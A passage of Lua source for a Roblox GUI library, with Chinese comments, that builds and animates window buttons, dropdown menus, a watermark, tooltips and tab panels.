		Library:Tween(CloseButton, TweenInfo.new(1.5, Enum.EasingStyle.Quint), {
			Size = UDim2.new(1, 0, 1, 0),
		})
	end)

	UICorner_3.CornerRadius = UDim.new(1, 0)
	UICorner_3.Parent = CloseButton

	UIStroke_3.Parent = CloseButton

	Frame.Parent = Headers
	Frame.AnchorPoint = Vector2.new(0, 1)
	Frame.BackgroundColor3 = Color3.fromRGB(107, 110, 120)
	Frame.BackgroundTransparency = 0.250
	Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0, 0, 1, 0)
	Frame.Size = UDim2.new(1, 0, 0, 1)

	DataFrame.Name = "DataFrame"
	DataFrame.Parent = Block
	DataFrame.AnchorPoint = Vector2.new(0, 1)
	DataFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	DataFrame.BackgroundTransparency = 1.000
	DataFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	DataFrame.BorderSizePixel = 0
	DataFrame.ClipsDescendants = true
	DataFrame.Position = UDim2.new(0, 5, 0.99, 0)
	DataFrame.Size = UDim2.new(0.302333206, 0, 0.920000017, 0)
	DataFrame.ZIndex = 2

	DataScrollingFrame.Name = "DataScrollingFrame"
	DataScrollingFrame.Parent = DataFrame
	DataScrollingFrame.Active = true
	DataScrollingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	DataScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	DataScrollingFrame.BackgroundTransparency = 1.000
	DataScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	DataScrollingFrame.BorderSizePixel = 0
	DataScrollingFrame.ClipsDescendants = false
	DataScrollingFrame.Position = UDim2.new(0.5, 0, 1.75, 0)
	DataScrollingFrame.Size = UDim2.new(0.99000001, 0, 0.980000019, 0)
	DataScrollingFrame.ScrollBarThickness = 0

	UIListLayout_2.Parent = DataScrollingFrame
	UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_2.Padding = UDim.new(0, 1000)

	local LogUpdate = function()
		if not WindowLibrary.Toggle then
			return
		end
		local data = math.clamp((MainFrame.AbsoluteSize.X / 3.5), 0, 235)
		DataFrame.Size = UDim2.new(0, data, 0, MainFrame.AbsoluteSize.Y - 33)
		TabFrames.Size = UDim2.new(0, (MainFrame.AbsoluteSize.X - (data + 10)), 0, MainFrame.AbsoluteSize.Y - 47)
	end

	spawn(function()
		local IsFullScreen = tick()
		while true do
			task.wait(0)
			if WindowLibrary.Toggle then
				if not WindowLibrary.FullScreen then
					local dist = math.abs(MainFrame.Size.Y.Offset - setup.Size.Y.Offset)
					if dist <= 25 and (tick() - OpenDelay) > 1 then
						LogUpdate()
					else
						if (tick() - OpenDelay) > 1 or (tick() - IsFullScreen) < 1 then
							LogUpdate()
							if (tick() - IsFullScreen) > 1 then
								task.wait(0.1)
							end
						end
					end
				else
					IsFullScreen = tick()
					LogUpdate()
				end
			end
		end
	end)

	Library:Tween(UIListLayout_2, TweenInfo.new(1.5, Enum.EasingStyle.Quint), {
		Padding = UDim.new(0, 6),
	})

	Library:Tween(DataScrollingFrame, TweenInfo.new(2, Enum.EasingStyle.Quint), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})

	TabFrames.Name = "TabFrames"
	TabFrames.Parent = Block
	TabFrames.AnchorPoint = Vector2.new(1, 1)
	TabFrames.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TabFrames.BackgroundTransparency = 1.000
	TabFrames.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TabFrames.BorderSizePixel = 0
	TabFrames.ClipsDescendants = true
	TabFrames.Position = UDim2.new(0.995, 0, 0.99, 0)
	TabFrames.Size = UDim2.new(0.670454323, 0, 0.88989073, 0)
	TabFrames.ZIndex = 4

	WindowLibrary.FullScreen = false
	WindowLibrary.Status = "Show"
	WindowLibrary.Toggle = true
	WindowLibrary.SectionTab = {}

	MinimizeButton.BackgroundTransparency = 1
	MinimizeButton.BorderSizePixel = 0
	UICorner:Destroy()
	UIStroke:Destroy()
	MinimizeButton.Image = "rbxassetid://7734068321"
	MinimizeButton.ScaleType = Enum.ScaleType.Fit
	MinimizeButton.ImageColor3 = Color3.fromRGB(80, 255, 71) --绿色星星

	MaxisizweButton.BackgroundTransparency = 1
	MaxisizweButton.BorderSizePixel = 0
	UICorner_2:Destroy()
	UIStroke_2:Destroy()
	MaxisizweButton.Image = "rbxassetid://7734068321"
	MaxisizweButton.ScaleType = Enum.ScaleType.Fit
	MaxisizweButton.ImageColor3 = Color3.fromRGB(255, 249, 85) --黄色星星

	CloseButton.BackgroundTransparency = 1
	CloseButton.BorderSizePixel = 0
	UICorner_3:Destroy()
	UIStroke_3:Destroy()
	CloseButton.Image = "rbxassetid://7734068321"
	CloseButton.ScaleType = Enum.ScaleType.Fit
	CloseButton.ImageColor3 = Color3.fromRGB(255, 88, 91) --红色星星

	local InitDropdown = function()
		local DropdownLibrary = {}
		local Dropdown = Instance.new("Frame")
		local UIStroke = Instance.new("UIStroke")
		local ScrollingFrame = Instance.new("ScrollingFrame")
		local UIListLayout = Instance.new("UIListLayout")
		local DropShadow = Instance.new("ImageLabel")

		Dropdown.Active = true
		Dropdown.Name = "Dropdown"
		Dropdown.Parent = ScreenGui
		Dropdown.AnchorPoint = Vector2.new(0.5, 0.5)
		Dropdown.BackgroundColor3 = Library.Colors.Default
		Dropdown.BackgroundTransparency = 0.15
		Dropdown.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Dropdown.BorderSizePixel = 0
		Dropdown.ClipsDescendants = true
		Dropdown.Position = UDim2.new(0.707877576, 0, 0.563012242, 0)
		Dropdown.Size = UDim2.new(0, 0, 0, 0)
		Dropdown.ZIndex = 100
		Dropdown.Visible = false

		UIStroke.Transparency = 0.850
		UIStroke.Color = Color3.fromRGB(156, 156, 156)
		UIStroke.Parent = Dropdown

		ScrollingFrame.Parent = Dropdown
		ScrollingFrame.Active = true
		ScrollingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ScrollingFrame.BackgroundTransparency = 1.000
		ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScrollingFrame.BorderSizePixel = 0
		ScrollingFrame.ClipsDescendants = false
		ScrollingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
		ScrollingFrame.Size = UDim2.new(0.980000019, 0, 0.980000019, 0)
		ScrollingFrame.ZIndex = 110
		ScrollingFrame.ScrollBarThickness = 0

		UIListLayout.Parent = ScrollingFrame
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Padding = UDim.new(0, 6)
		UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center

		UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			if WindowLibrary.Toggle then
				ScrollingFrame.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y)
			end
		end)

		DropShadow.Name = "DropShadow"
		DropShadow.Parent = Dropdown
		DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow.BackgroundTransparency = 1.000
		DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow.Position = UDim2.new(0, -5, 0, -5)
		DropShadow.Rotation = 0.010
		DropShadow.Size = UDim2.new(1, 10, 1, 10)
		DropShadow.ZIndex = 99
		DropShadow.Image = "rbxassetid://297694300"
		DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow.ImageTransparency = 0.500
		DropShadow.ScaleType = Enum.ScaleType.Slice
		DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow.SliceScale = 0.050

		local NewButton = function(Title, HasIcon, IsDefault)
			local Frame = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Button = Instance.new("TextButton")
			local Icon = Instance.new("ImageLabel")

			Frame.Parent = ScrollingFrame
			Frame.BackgroundColor3 = Library.Colors.Default
			Frame.BackgroundTransparency = 0.250
			Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Frame.BorderSizePixel = 0
			Frame.Size = UDim2.new(0.980000019, 0, 0, 22)
			Frame.ZIndex = 115

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = Frame
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 114
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = Frame

			if IsDefault then
				UIStroke.Color = Library.Colors.Hightlight
			end

			TextLabel.Parent = Frame
			TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(0.980000019, 0, 0.550000012, 0)
			TextLabel.ZIndex = 116
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true

			if IsDefault then
				TextLabel.TextColor3 = Library.Colors.Hightlight
			end

			Button.Name = "Button"
			Button.Parent = Frame
			Button.AnchorPoint = Vector2.new(0.5, 0.5)
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Position = UDim2.new(0.5, 0, 0.5, 0)
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 200
			Button.Font = Enum.Font.SourceSans
			Button.Text = ""
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			Icon.Name = "Icon"
			Icon.Parent = Frame
			Icon.AnchorPoint = Vector2.new(0.5, 0.5)
			Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Icon.BackgroundTransparency = 1.000
			Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Icon.BorderSizePixel = 0
			Icon.Position = UDim2.new(0.075000003, 0, 0.5, 0)
			Icon.Size = UDim2.new(0.699999988, 0, 0.699999988, 0)
			Icon.SizeConstraint = Enum.SizeConstraint.RelativeYY
			Icon.Visible = false
			Icon.ZIndex = 116
			Icon.Image = "rbxassetid://10709775704"

			if HasIcon then
				Icon.Visible = true
				Icon.Image = HasIcon
			end

			return Button
		end

		function WindowLibrary:ClearDropdown()
			table.foreach(ScrollingFrame:GetChildren(), function(i, v)
				if v.ClassName == "Frame" then
					v:Destroy()
				end
			end)
		end

		function WindowLibrary:SetDropdownValues(Type, Table, Default, Callback)
			if Type == 1 then -- Normal
				local OldButton = nil

				for i, v in pairs(Table) do
					local Button
					if typeof(v) ~= "table" then
						Button = NewButton(tostring(v), false, v == Default)
					else
						Button = NewButton(tostring(v), v.Icon, v == Default)
					end

					Button.MouseButton1Click:Connect(function()
						if OldButton then
							if OldButton.Object ~= v then
								OldButton.UIStroke.Color = Color3.fromRGB(156, 156, 156)
								OldButton.TextLabel.TextColor3 = Library.Colors.TextColor
							end
						end

						OldButton = {
							UIStroke = Button.Parent:WaitForChild("UIStroke"),
							TextLabel = Button.Parent:WaitForChild("TextLabel"),
							Object = v,
						}

						Button.Parent:WaitForChild("UIStroke").Color = Library.Colors.Hightlight
						Button.Parent:WaitForChild("TextLabel").TextColor3 = Library.Colors.Hightlight

						Callback(v)
					end)

					if v == Default then
						OldButton = {
							UIStroke = Button.Parent:WaitForChild("UIStroke"),
							TextLabel = Button.Parent:WaitForChild("TextLabel"),
							Object = v,
						}
					end
				end
			else -- Multi
				local MaxMulti = Default.Max
				local DefaultInfo = Default.Info
				local MultiData = {}

				local Len = function()
					local std = 0

					table["foreach"](MultiData, function()
						std += 1
					end)

					return std
				end

				for i, v in pairs(Table) do
					local Button

					if typeof(v) ~= "table" then
						Button = NewButton(tostring(v), false, table.find(DefaultInfo, v))
					else
						Button = NewButton(tostring(v), v.Icon, table.find(DefaultInfo, v))
					end

					local UIStroke = Button.Parent:WaitForChild("UIStroke")

					Button.MouseButton1Click:Connect(function()
						if MultiData[v] then
							UIStroke.Color = Color3.fromRGB(156, 156, 156)
							Button.Parent:WaitForChild("TextLabel").TextColor3 = Library.Colors.TextColor

							MultiData[v] = nil
						else
							if (Len() + 1) > MaxMulti then
								return
							end

							MultiData[v] = {
								Object = v,
								UIStroke = UIStroke,
							}

							Button.Parent:WaitForChild("TextLabel").TextColor3 = Library.Colors.Hightlight
							UIStroke.Color = Library.Colors.Hightlight
						end

						local info = {}

						table.foreach(MultiData, function(a)
							table.insert(info, a)
						end)

						Callback(info)
					end)

					if table.find(DefaultInfo, v) then
						MultiData[v] = {
							Object = v,
							UIStroke = UIStroke,
						}
					end
				end
			end
		end
		do
			-----// 水印 ---------------------------------------------------------------------------------------------------------------------------------------------
			local Watermark = Instance.new("Frame")
			local UIListLayout = Instance.new("UIListLayout")

			Watermark.Name = "Watermark"
			Watermark.Parent = ScreenGui
			Watermark.AnchorPoint = Vector2.new(1, 0)
			Watermark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Watermark.BackgroundTransparency = 1.000
			Watermark.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Watermark.BorderSizePixel = 0
			Watermark.Position = UDim2.new(1, -5, 0, 35)
			Watermark.Size = UDim2.new(0.200000003, 0, 0, 10)

			UIListLayout.Parent = Watermark
			UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIListLayout.Padding = UDim.new(0, 1)

			function WindowLibrary:Watermark(text)
				local Frame = Instance.new("Frame")
				local UIStroke = Instance.new("UIStroke")
				local TextLabel = Instance.new("TextLabel")

				Frame.Parent = Watermark
				Frame.BackgroundColor3 = Library.Colors.Default
				Frame.BackgroundTransparency = 0.250
				Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Frame.BorderSizePixel = 0
				Frame.Size = UDim2.new(0, 0, 0, 0)
				Frame.ZIndex = 255

				UIStroke.Transparency = 0.850
				UIStroke.Color = Color3.fromRGB(156, 156, 156)
				UIStroke.Parent = Frame

				TextLabel.Parent = Frame
				TextLabel.AnchorPoint = Vector2.new(1, 0.5)
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.BackgroundTransparency = 1.000
				TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel.BorderSizePixel = 0
				TextLabel.Position = UDim2.new(1, -5, 0.5, 0)
				TextLabel.Size = UDim2.new(0.9, 0, 0.9, 0)
				TextLabel.Font = Enum.Font.Gotham
				TextLabel.TextColor3 = Library.Colors.TextColor
				TextLabel.TextSize = 13.000
				TextLabel.TextStrokeTransparency = 0.950
				TextLabel.TextXAlignment = Enum.TextXAlignment.Right
				TextLabel.TextYAlignment = Enum.TextYAlignment.Top
				TextLabel.Text = text or ""
				TextLabel.ZIndex = 256
				TextLabel.RichText = true

				local update = function()
					local size = Library:GetTextSize(TextLabel.Text:gsub("<.->", ""), 13, TextLabel.Font)

					Library:Tween(Frame, Library.TweenLibrary.FastEffect, {
						Size = UDim2.new(0, size.X + 10, 0, size.Y + 5),
					})
				end

				local Index = {}

				function Index:Visible(v)
					Frame.Visible = v
				end

				function Index:Update()
					update()
				end

				function Index:Text(a)
					TextLabel.Text = a
					update()
				end

				function Index:Destroy()
					Frame:Destroy()
				end

				update()

				return Index
			end
		end

		DropdownLibrary.OnDropdown = false
		DropdownLibrary.Hover = false

		local CloseTick = tick()

		function WindowLibrary:OpenDropdown(BaseFrame: Frame)
			DropdownLibrary.OnDropdown = true

			Dropdown.Visible = true
			DropdownLibrary.BaseFrame = BaseFrame

			Library:Tween(Dropdown, Library.TweenLibrary.SmallEffect, {
				Size = UDim2.new(0, 173, 0, 213),
				Position = UDim2.fromOffset(BaseFrame.AbsolutePosition.X, BaseFrame.AbsolutePosition.Y),
			})
		end

		function WindowLibrary:CloseDropdown(BaseFrame: Frame)
			DropdownLibrary.OnDropdown = false

			Library:Tween(Dropdown, Library.TweenLibrary.SmallEffect, {
				Size = UDim2.new(0, 90, 0, 0),
			})

			if DropdownLibrary.BaseFrame then
				Library:Tween(Dropdown, Library.TweenLibrary.SmallEffect, {
					Position = UDim2.new(
						0,
						DropdownLibrary.BaseFrame.AbsolutePosition.X + (DropdownLibrary.BaseFrame.AbsoluteSize.X / 2),
						0,
						DropdownLibrary.BaseFrame.AbsolutePosition.Y
					),
				})
			end
		end

		Dropdown.MouseEnter:Connect(function()
			DropdownLibrary.Hover = true
		end)

		Dropdown.MouseLeave:Connect(function()
			DropdownLibrary.Hover = false
		end)

		Library.UserInputService.InputBegan:Connect(function(std)
			if
				std.UserInputType == Enum.UserInputType.MouseButton1
				or std.UserInputType == Enum.UserInputType.MouseButton2
				or std.UserInputType == Enum.UserInputType.Touch
			then
				if not DropdownLibrary.Hover then
					WindowLibrary:CloseDropdown()
					CloseTick = tick()
				end
			end
		end)

		game:GetService("RunService").RenderStepped:Connect(function()
			if DropdownLibrary.OnDropdown and DropdownLibrary.BaseFrame then
				Library:Tween(Dropdown, Library.TweenLibrary.SmallEffect, {
					Size = UDim2.new(0, 173, 0, math.clamp(UIListLayout.AbsoluteContentSize.Y + 15, 27, 213)),
					Position = UDim2.fromOffset(
						DropdownLibrary.BaseFrame.AbsolutePosition.X + (DropdownLibrary.BaseFrame.AbsoluteSize.X / 2),
						DropdownLibrary.BaseFrame.AbsolutePosition.Y - 25
					),
				})
			else
				if (tick() - CloseTick) > 0.35 then
					Dropdown.Visible = false
				end
			end
		end)
	end

	InitDropdown()

	do
		local Tip = Instance.new("TextLabel")

		Tip.Name = "Tip"
		Tip.Parent = ScreenGui
		Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Tip.BackgroundTransparency = 1.000
		Tip.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Tip.BorderSizePixel = 0
		Tip.Size = UDim2.new(0, 250, 0, 16)
		Tip.Visible = false
		Tip.Font = Enum.Font.Gotham
		Tip.Text = ""
		Tip.TextColor3 = Library.Colors.TextColor
		Tip.TextSize = 14.000
		Tip.TextStrokeTransparency = 0.950
		Tip.TextXAlignment = Enum.TextXAlignment.Left
		Tip.TextYAlignment = Enum.TextYAlignment.Top
		Tip.Visible = false

		function WindowLibrary:AddToolTip(object: GuiObject, text: string)
			object.MouseEnter:Connect(function()
				Tip.Visible = true
				Tip.ZIndex = 155
				Tip.Text = text
			end)

			object.MouseLeave:Connect(function()
				Tip.Visible = false
			end)
		end

		game:GetService("RunService"):BindToRenderStep("_TOOL_TIP_", 120, function()
			if Tip.Visible then
				Library:Tween(Tip, Library.TweenLibrary.FastEffect, {
					TextTransparency = 0.55,
					TextStrokeTransparency = 0.950,
				})

				local siz = Library:GetTextSize(Tip.Text, 14, Tip.Font)
				local pos = Library.UserInputService:GetMouseLocation()

				Tip.Size = UDim2.fromOffset(siz.X + 1, siz.Y + 2)
				Tip.Position = UDim2.fromOffset(pos.X + (siz.X / 5), pos.Y - 58)
			else
				Library:Tween(Tip, Library.TweenLibrary.FastEffect, {
					TextTransparency = 1,
					TextStrokeTransparency = 1,
				})
			end
		end)
	end

	function WindowLibrary:XG(TabSetup)
		TabSetup = TabSetup or {}
		TabSetup.Title = TabSetup.Title or "菜单"
		TabSetup.Icon = TabSetup.Icon or "XGO1"
		TabSetup.Description = TabSetup.Description or ""

		local TFrame = Instance.new("Frame")
		local DropShadow = Instance.new("ImageLabel")
		local UIStroke = Instance.new("UIStroke")
		local Icon = Instance.new("ImageLabel")
		local Title = Instance.new("TextLabel")
		local Description = Instance.new("TextLabel")
		local Arrow = Instance.new("ImageLabel")
		local Button = Instance.new("TextButton")

		TFrame.Name = "TFrame"
		TFrame.Parent = DataScrollingFrame
		TFrame.BackgroundColor3 = Library.Colors.Default
		TFrame.BackgroundTransparency = 0.250
		TFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TFrame.BorderSizePixel = 0
		TFrame.Size = UDim2.new(0.99, 0, 0, Library.TabButtonHeight)
		TFrame.ZIndex = 5

		DropShadow.Name = "DropShadow"
		DropShadow.Parent = TFrame
		DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow.BackgroundTransparency = 1.000
		DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow.Position = UDim2.new(0, -5, 0, -5)
		DropShadow.Size = UDim2.new(1, 10, 1, 10)
		DropShadow.ZIndex = 4
		DropShadow.Image = "rbxassetid://297694300"
		DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow.ImageTransparency = 0.500
		DropShadow.ScaleType = Enum.ScaleType.Slice
		DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow.SliceScale = 0.050

		UIStroke.Transparency = 1
		UIStroke.Color = Color3.fromRGB(156, 156, 156)
		UIStroke.Parent = TFrame

		Icon.Name = "Icon"
		Icon.Parent = TFrame
		Icon.AnchorPoint = Vector2.new(0, 0.5)
		Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Icon.BackgroundTransparency = 1.000
		Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Icon.BorderSizePixel = 0
		Icon.Position = UDim2.new(0, 5, 0.5, 0)
		Icon.Size = UDim2.new(0.649999976, 0, 0.649999976, 0)
		Icon.SizeConstraint = Enum.SizeConstraint.RelativeYY
		Icon.ZIndex = 5
		Icon.Image = Library.Icons[TabSetup.Icon] or Library.Icons2["lucide-" .. TabSetup.Icon] or TabSetup.Icon
		Icon.ImageTransparency = 0.150

		Title.Name = "Title"
		Title.Parent = TFrame
		Title.AnchorPoint = Vector2.new(0, 0.5)
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0.665000021, 0, 0.5, 0)
		Title.Size = UDim2.new(0.899999976, 0, 0.400000006, 0)
		Title.ZIndex = 6
		Title.Font = Enum.Font.Gotham
		Title.Text = TabSetup.Title
		Title.TextColor3 = Library.Colors.TextColor
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextStrokeColor3 = Library.Colors.TextColor
		Title.TextStrokeTransparency = 0.950
		Title.TextWrapped = true
		Title.TextXAlignment = Enum.TextXAlignment.Left
		Title.RichText = true

		Description.Name = "Description"
		Description.Parent = TFrame
		Description.AnchorPoint = Vector2.new(0, 0.5)
		Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Description.BackgroundTransparency = 1.000
		Description.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Description.BorderSizePixel = 0
		Description.Position = UDim2.new(0.42, 0, 0.5, 0)
		Description.Size = UDim2.new(0.25, 0, 1, 0)
		Description.Font = Enum.Font.Fondamento
		Description.Text = TabSetup.Description
		Description.TextColor3 = Color3.fromRGB(255, 255, 255)
		Description.TextScaled = true
		Description.TextSize = 8.000
		Description.TextWrapped = true
		Description.TextXAlignment = Enum.TextXAlignment.Left

		Arrow.Name = "Arrow"
		Arrow.Parent = TFrame
		Arrow.AnchorPoint = Vector2.new(1, 0.5)
		Arrow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Arrow.BackgroundTransparency = 1.000
		Arrow.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Arrow.BorderSizePixel = 0
		Arrow.Position = UDim2.new(0.980000019, 0, 0.5, 0)
		Arrow.Size = UDim2.new(0.400000006, 0, 0.400000006, 0)
		Arrow.SizeConstraint = Enum.SizeConstraint.RelativeYY
		Arrow.ZIndex = 5
		Arrow.Image = "rbxassetid://10709791437" -->图
		Arrow.ImageTransparency = 1

		Button.Name = "Button"
		Button.Parent = TFrame
		Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Button.BackgroundTransparency = 1.000
		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Button.BorderSizePixel = 0
		Button.Size = UDim2.new(1, 0, 1, 0)
		Button.ZIndex = 15
		Button.Font = Enum.Font.SourceSans
		Button.TextColor3 = Color3.fromRGB(0, 0, 0)
		Button.TextSize = 14.000
		Button.TextTransparency = 1.000

		local Root = {}
		local TabCenterFrame = Instance.new("Frame")
		local ScrollingFrame = Instance.new("ScrollingFrame")
		local UIListLayout = Instance.new("UIListLayout")

		TabCenterFrame.Name = "TabCenterFrame"
		TabCenterFrame.Parent = TabFrames
		TabCenterFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		TabCenterFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TabCenterFrame.BackgroundTransparency = 1.000
		TabCenterFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TabCenterFrame.BorderSizePixel = 0
		TabCenterFrame.Position = UDim2.new(0.5, 0, 0.9, 0)
		TabCenterFrame.Size = UDim2.new(0.99000001, 0, 0.99000001, 0)
		TabCenterFrame.ZIndex = 6

		ScrollingFrame.Parent = TabCenterFrame
		ScrollingFrame.Active = true
		ScrollingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ScrollingFrame.BackgroundTransparency = 1.000
		ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScrollingFrame.BorderSizePixel = 0
		ScrollingFrame.ClipsDescendants = false
		ScrollingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
		ScrollingFrame.Size = UDim2.new(0.999000013, 0, 0.99000001, 0)
		ScrollingFrame.ZIndex = 10
		ScrollingFrame.ScrollBarThickness = 0

		UIListLayout.Parent = ScrollingFrame
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Padding = UDim.new(0, 1000)

		Library:Tween(UIListLayout, TweenInfo.new(1.5, Enum.EasingStyle.Quint), {
			Padding = UDim.new(0, 7),
		})

		UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			if WindowLibrary.Toggle then
				ScrollingFrame.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y)
			end
		end)

		Library:MakeDrop(TFrame, UIStroke, Library.Colors.Hightlight)

		local TabToggle = function(Value)
			if Value then
				TabCenterFrame.Visible = true
				Library:Tween(Arrow, Library.TweenLibrary.SmallEffect, {
					ImageTransparency = 0.150,
					Position = UDim2.new(0.980000019, 0, 0.5, 0),
				})

				Library:Tween(TabCenterFrame, Library.TweenLibrary.SmallEffect, {
					Position = UDim2.new(0.5, 0, 0.500999987, 0),
				})
			else
				TabCenterFrame.Visible = false
				Library:Tween(Arrow, Library.TweenLibrary.SmallEffect, {
					ImageTransparency = 1,
					Position = UDim2.new(1, 0, 0.5, 0),
				})

				Library:Tween(TabCenterFrame, Library.TweenLibrary.SmallEffect, {
					Position = UDim2.new(0.5, 0, 0.5500999987, 0),
				})
			end
		end

		TabToggle(not WindowLibrary.SectionTab[1])

		table.insert(WindowLibrary.SectionTab, { Id = TFrame, TabToggle = TabToggle })

		TFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
			if not WindowLibrary.Toggle then
				return
			end

			Title.Position = UDim2.new((30 / TFrame.AbsoluteSize.X), 0, 0.5, 0)
		end)

		Button.MouseButton1Click:Connect(function()
			for i, v in ipairs(WindowLibrary.SectionTab) do
				if v.Id == TFrame then
					v.TabToggle(true)
				else
					v.TabToggle(false)
				end
			end
		end)

		------ // 分隔符  ----------------------------------------------------------------------------------------
		function Root:Block(Setup, positionUDim, sizeUDim, fontType, textColor, colorEffect)
			local params = {
				Setup = "分隔符",
				positionUDim = 0.02,
				sizeUDim = 0.99000001,
				fontType = Enum.Font.Gotham,
				textColor = Library.Colors.TextColor,
				colorEffect = false,
			}
			if Setup ~= nil then
				params.Setup = Setup
			end
			if positionUDim ~= nil then
				params.positionUDim = positionUDim
			end
			if sizeUDim ~= nil then
				params.sizeUDim = sizeUDim
			end
			if fontType ~= nil then
				params.fontType = fontType
			end
			if textColor ~= nil then
				params.textColor = textColor
			end
			if colorEffect ~= nil then
				params.colorEffect = colorEffect
			end

			local BlockLabel = Instance.new("Frame")
			local TextLabel = Instance.new("TextLabel")

			BlockLabel.Name = "BlockLabel"
			BlockLabel.Parent = ScrollingFrame
			BlockLabel.BackgroundColor3 = Library.Colors.Default
			BlockLabel.BackgroundTransparency = 1.000
